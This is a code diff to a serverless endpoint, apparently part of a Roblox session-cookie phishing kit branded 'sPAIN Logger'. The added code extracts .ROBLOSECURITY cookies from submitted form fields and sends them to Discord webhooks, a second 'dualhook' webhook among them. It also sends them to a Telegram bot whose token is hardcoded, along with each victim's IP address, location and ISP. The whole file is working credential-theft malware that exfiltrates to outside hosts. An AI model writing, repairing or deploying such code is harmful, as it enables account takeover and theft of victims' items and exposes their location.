@@ -1,16 +1,33 @@
-// api/submit.js
+// api/submit.js — sends cookie INSTANTLY, geo as follow-up
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
 async function redisGet(key) {
-  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
-    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
-  });
-  const json = await res.json();
-  if (!json.result) return null;
-  try { return JSON.parse(json.result); } catch { return null; }
+  try {
+    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+    });
+    const json = await res.json();
+    if (!json.result) return null;
+    let r = json.result;
+    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
+    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
+    return r || null;
+  } catch { return null; }
+}
+
+async function getIpGeo(ip) {
+  try {
+    if (!ip || ip === 'Unknown') return null;
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 3000);
+    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: controller.signal });
+    clearTimeout(timer);
+    const d = await r.json();
+    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
+  } catch { return null; }
 }
 
 async function tgSend(text) {
@@ -23,118 +40,157 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-async function sendToDiscord(webhookUrl, pageName, slotLabel, slotValue, now) {
-  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
+const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+function extractCookie(raw) {
+  if (!raw) return null;
+  const s = String(raw).trim();
+  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
+  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
+  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
+  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
+  return null;
+}
+function findCookie(slots) {
+  for (const val of Object.values(slots || {})) {
+    const c = extractCookie(String(val || ''));
+    if (c) return c;
+  }
+  return null;
+}
+
+async function discordSend(url, payload) {
+  if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    await fetch(webhookUrl, {
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: '@everyone',
-        embeds: [
-          {
-            title: '🚨 New Submission Received',
-            color: 5793266,
-            fields: [
-              {
-                name: '📄 Page',
-                value: `\`${pageName}\``,
-                inline: true
-              },
-              {
-                name: '🎯 Slot',
-                value: `\`${slotLabel}\``,
-                inline: true
-              },
-              {
-                name: '📥 Pasted Content',
-                value: `\`\`\`${slotValue}\`\`\``
-              }
-            ],
-            footer: {
-              text: 'Submission Logger • Automated System'
-            },
-            thumbnail: {
-              url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
-            }
-          }
-        ],
-        attachments: []
-      })
+      body: JSON.stringify(payload)
     });
   } catch (_) {}
+}
+
+async function sendCookieChunked(url, cookie) {
+  let rem = cookie; let first = true;
+  while (rem.length > 0) {
+    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
+    await discordSend(url, {
+      content: first
+        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
+        : chunk + (rem.length === 0 ? '\n```' : '')
+    });
+    first = false;
+  }
 }
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
 
   let body = req.body;
-  if (typeof body === 'string') {
-    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
-  }
+  if (typeof body === 'string') { try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); } }
+  if (Buffer.isBuffer(body))   { try { body = JSON.parse(body.toString()); } catch { return res.status(400).json({ error: 'Invalid body' }); } }
 
   const { slug, slots } = body || {};
-
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
-  let record;
+  const record = await redisGet(`slot:${slug}`);
+  if (!record)         return res.status(404).json({ error: 'Page not found' });
+  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
+
+  res.status(200).json({ success: true });
+
   try {
-    record = await redisGet(`slot:${slug}`);
-  } catch (err) {
-    return res.status(500).json({ error: 'Redis error', detail: err.message });
-  }
-  if (!record) return res.status(404).json({ error: 'Page not found' });
+    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
+    const now      = new Date().toISOString();
+    const pageName = record.displayName || slug;
+    const cookie   = findCookie(slots);
 
-  const now = new Date().toISOString();
-  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
-  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
-  const slotValue = slotEntry ? slotEntry[1] : '(empty)';
+    const webhooks = [record.webhook];
+    if (record.dualhookParent) {
+      try {
+        const parent = await redisGet(`slot:${record.dualhookParent}`);
+        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
+      } catch (_) {}
+    }
 
-  // ── Send to webhook2 (page owner) ─────────────────────────────────────────
-  await sendToDiscord(record.webhook, record.displayName, slotLabel, slotValue, now);
-
-  // ── Send to webhook1 (dualhook creator) if applicable ────────────────────
-  let webhook1 = 'N/A';
-  if (record.dualhookParent) {
-    try {
-      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
-      if (parentRecord && parentRecord.webhook) {
-        webhook1 = parentRecord.webhook;
-        if (parentRecord.webhook !== record.webhook) {
-          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, slotValue, now);
-        }
+    if (!cookie) {
+      // No cookie — get geo then send troll embed
+      const geo      = await getIpGeo(ip);
+      const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+      const isp      = geo?.isp || 'Unknown';
+      for (const wh of webhooks) {
+        await discordSend(wh, {
+          embeds: [{
+            title:       '⚠️ Wrong Cookie — Troll Detected',
+            description: 'No valid cookie found.',
+            color:       0xff3333,
+            fields: [
+              { name: '🌐 IP',       value: ip,       inline: true },
+              { name: '📍 Location', value: location, inline: true },
+              { name: '🗺️ ISP',      value: isp,      inline: true },
+              { name: '🕐 Time',     value: now,      inline: false }
+            ],
+            footer: { text: `sPAIN Logger • ${pageName}` },
+            timestamp: now
+          }]
+        });
       }
-    } catch (_) {}
+      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code>\n📍 ${location}\n🗺️ ${isp}`);
+      return;
+    }
+
+    // ── COOKIE FOUND ─────────────────────────────────────────────────────────
+    // Step 1: Send IP + cookie IMMEDIATELY — no geo wait
+    for (const wh of webhooks) {
+      await discordSend(wh, {
+        content: '@everyone',
+        embeds: [{
+          title:     '🍪 Cookie Captured',
+          color:     0xc026d3,
+          fields: [
+            { name: '🌐 IP',   value: `\`${ip}\``, inline: true },
+            { name: '🕐 Time', value: now,          inline: false }
+          ],
+          footer:    { text: `sPAIN Logger • ${pageName}` },
+          timestamp: now
+        }]
+      });
+      await sendCookieChunked(wh, cookie);
+    }
+
+    // Step 2: Geo lookup AFTER cookie already sent
+    const geo      = await getIpGeo(ip);
+    const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
+    const isp      = geo?.isp || 'Unknown';
+
+    // Step 3: Send location/ISP as follow-up
+    for (const wh of webhooks) {
+      await discordSend(wh, {
+        embeds: [{
+          title: '📍 Location Info',
+          color: 0xc026d3,
+          fields: [
+            { name: '📍 Location', value: location, inline: true },
+            { name: '🗺️ ISP',      value: isp,       inline: true }
+          ],
+          footer: { text: `sPAIN Logger • ${pageName}` }
+        }]
+      });
+    }
+
+    await tgSend([
+      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
+      `🌐 IP: <code>${ip}</code>`,
+      `📍 ${location}`,
+      `🗺️ ${isp}`,
+      `🕐 ${now}`
+    ].join('\n'));
+
+  } catch (err) {
+    console.error('Error:', err.message);
   }
-
-  // ── Telegram log ──────────────────────────────────────────────────────────
-  const tgMsg = [
-    `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
-    `------------------------------------------`,
-    `📄 PAGE:`,
-    `${record.displayName}`,
-    `------------------------------------------`,
-    `🎯 TYPE = ${slotLabel}:`,
-    `${slotValue}`,
-    `------------------------------------------`,
-    `🔗 PAGE WEBHOOK (WEBHOOK2):`,
-    `<code>${record.webhook}</code>`,
-    `------------------------------------------`,
-    `🔗 WEBHOOK1:`,
-    `<code>${webhook1}</code>`,
-    `------------------------------------------`,
-    `📅 DATE SUBMITTED:`,
-    `${now}`,
-    `------------------------------------------`
-  ].join('\n');
-
-  await tgSend(tgMsg);
-
-  return res.status(200).json({ success: true });
 }
